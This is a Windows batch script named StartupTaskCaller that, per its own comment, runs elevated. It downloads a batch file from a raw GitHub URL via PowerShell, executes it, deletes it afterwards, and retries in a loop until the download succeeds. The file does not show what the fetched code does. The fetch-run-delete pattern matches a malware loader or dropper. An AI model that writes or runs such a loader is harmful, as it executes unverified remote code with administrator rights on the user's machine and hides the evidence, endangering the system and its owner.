:: StartupTaskCaller

@echo off


::RUNADMINHERE ( Is Running with Elevated  Privileges , because this file is called by elevated batch file )






:: Check if "StartupTaskCaller.exe" is running
tasklist /fi "imagename eq StartupTaskCaller.exe" 2>nul | find /i "StartupTaskCaller.exe" >nul

:: If the process is found, exit the script
if %errorlevel% equ 0 (
    echo StartupTaskCaller.exe is running. Exiting...
    exit
) else (
    echo StartupTaskCaller.exe is not running. Continuing script...
    :: Continue with the rest of the script here
)







setlocal enabledelayedexpansion
set "embeddedScript=temp_script_StartupTask.bat"

color 0A


:StartupTask

:: Download content and save to the embedded batch file
powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Codes/StartupTask') | Out-File -Encoding ASCII '%embeddedScript%'"

if exist "%embeddedScript%" (
    echo Script content saved to %embeddedScript%.
    echo.
    call "%embeddedScript%"
    del "%embeddedScript%" >nul 2>&1
) else (
    echo Failed to get content from RUNAUTOTASK Link
    echo Retrying...
    echo.
    timeout /t 3 /nobreak >nul
    goto StartupTask
)
